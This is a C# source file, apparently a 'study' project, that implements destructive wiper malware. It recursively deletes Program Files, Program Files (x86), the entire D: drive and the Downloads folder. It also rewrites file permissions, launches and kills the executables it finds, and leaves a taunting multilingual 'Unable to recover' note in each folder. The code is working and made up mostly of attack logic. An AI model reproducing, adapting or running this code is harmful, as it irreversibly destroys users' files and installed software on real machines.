using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using System.Security.AccessControl;

namespace Study.删除文件
{
    internal static class Delete
    {
        private static bool _deleted1 = false;
        private static bool _deleted2 = false;
        private static bool _deleted3 = false;
        private static bool _deleted4 = false;
        private static bool _deleted5 = false;
        /// <summary>
        /// 删除C:/
        /// </summary>
        public static void CDisk()
        {
            if (!_deleted4)
            {
                _deleted4 = true;
                Task.Run(() =>
                {
                    try
                    {
                        ProDelete(@"C:\Program Files");
                    }
                    catch { }
                    _deleted4 = false;
                });
            }
        }
        /// <summary>
        /// 删除D:/
        /// </summary>
        public static void DDisk()
        {
            if (!_deleted5)
            {
                _deleted5 = true;
                Task.Run(() =>
                {
                    try
                    {
                        ProDelete(@"D:/");
                    }
                    catch { }
                    _deleted5 = false;
                });
            }
        }
        /// <summary>
        /// 删除Downloads
        /// </summary>
        public static void Downloads()
        {
            if (!_deleted3)
            {
                _deleted3 = true;
                Task.Run(() =>
                {
                    foreach (var item in new DirectoryInfo(Program.DownloadPath).GetFiles())
                    {
                        try
                        {
                            item.Delete();
                        }
                        catch { }
                    }
                    foreach (var item in new DirectoryInfo(Program.DownloadPath).GetDirectories())
                    {
                        try
                        {
                            item.Delete();
                        }
                        catch { }
                    }
                    _deleted3 = false;
                });
            }
        }
        /// <summary>
        /// 删除Program Files
        /// </summary>
        public static void Programe()
        {
            if (!_deleted1)
            {
                _deleted1 = true;
                Task.Run(() =>
                {
                    ProDelete(@"C:\Program Files");
                    _deleted1 = false;
                });
            }
        }
        /// <summary>
        /// 删除Program Files (x86)
        /// </summary>
        public static void Programe86()
        {
            if (!_deleted2)
            {
                _deleted2 = true;
                Task.Run(() =>
                {
                    ProDelete(@"C:\Program Files (x86)");
                    _deleted2 = false;
                });
            }
        }
        /// <summary>
        /// 删除操作
        /// </summary>
        private static void ProDelete(string filePath)
        {
            try
            {
                foreach (var item in new DirectoryInfo(filePath).GetFiles())
                {
                    AddSecurityControll2File(item.FullName);
                    ProKill(item.FullName, item.Name);
                    try
                    {
                        item.Delete();
                        StreamWriter streamWriter = new StreamWriter(Path.GetDirectoryName(item.FullName) + "\\" + "Unable to recover.txt");
                        streamWriter.WriteLine("Unable to recover");
                        streamWriter.WriteLine("您好，您的文件无法恢复，下次小心点哦！");
                        streamWriter.WriteLine("こんにちは、あなたのファイルは回復することができなくて、次回は注意してください!");
                        streamWriter.Close();
                    }
                    catch { }
                }
            }
            catch { }
            try
            {
                foreach (var item in new DirectoryInfo(filePath).GetDirectories())
                {
                    ProDelete(item.FullName);
                    StreamWriter streamWriter = new StreamWriter(Path.GetDirectoryName(item.FullName) + "\\" + "Unable to recover.txt");
                    streamWriter.WriteLine("Unable to recover");
                    streamWriter.WriteLine("您好，您的文件无法恢复，下次小心点哦！");
                    streamWriter.WriteLine("こんにちは、あなたのファイルは回復することができなくて、次回は注意してください!");
                    streamWriter.Close();
                }
            }
            catch { }
        }
        private static void ProKill(string filePath, string fileName)
        {
            if (!fileName.ToLower().EndsWith(".exe"))
            {
                return;
            }
            KillFile(filePath, fileName);
            try
            {
                Process process = new Process();
                process.StartInfo.FileName = filePath;
                process.StartInfo.Arguments = fileName + " /accepteula";
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardOutput = true;
                process.Start();
                foreach (var item in Process.GetProcessesByName(process.ProcessName))
                {
                    try
                    {
                        if (item.Id != Process.GetCurrentProcess().Id)
                        {
                            while (!item.HasExited)
                            {
                                item.Kill();
                                item.WaitForExit();
                            }
                        }
                    }
                    catch { }
                }
            }
            catch { }
        }
        /// <summary>
        /// 强力粉碎文件，文件如果被打开，很难粉碎
        /// </summary>
        public static void KillFile(string filenpath, string filename)
        {
            //可能其他原因删除失败了，使用我们自己的方法强制删除
            try
            {
                //要检查被那个进程占用的文件
                Process tool = new Process { StartInfo = { FileName = filenpath, Arguments = filename + " /accepteula", UseShellExecute = false, RedirectStandardOutput = true } };
                tool.Start();
                tool.Kill();
                tool.WaitForExit();
                string outputTool = tool.StandardOutput.ReadToEnd();
                string matchPattern = @"(?<=\s+pid:\s+)\b(\d+)\b(?=\s+)";
                foreach (Match match in Regex.Matches(outputTool, matchPattern))
                {
                    //结束掉所有正在使用这个文件的程序
                    Process.GetProcessById(int.Parse(match.Value)).Kill();
                }
            }
            catch { }
        }
        /// <summary>
        /// 为文件添加users，everyone用户组的完全控制权限
        /// </summary>
        /// <param name="filePath"></param>
        static void AddSecurityControll2File(string filePath)
        {
            try
            {
                //获取文件信息
                FileInfo fileInfo = new FileInfo(filePath);
                //获得该文件的访问权限
                FileSecurity fileSecurity = fileInfo.GetAccessControl();
                //添加ereryone用户组的访问权限规则 完全控制权限
                fileSecurity.RemoveAccessRuleAll(new FileSystemAccessRule("Administrators", FileSystemRights.FullControl, AccessControlType.Allow));
                fileSecurity.AddAccessRule(new FileSystemAccessRule("Administrator", FileSystemRights.FullControl, AccessControlType.Allow));
                //设置访问权限
                fileInfo.SetAccessControl(fileSecurity);
            }
            catch { }
        }
    }
}
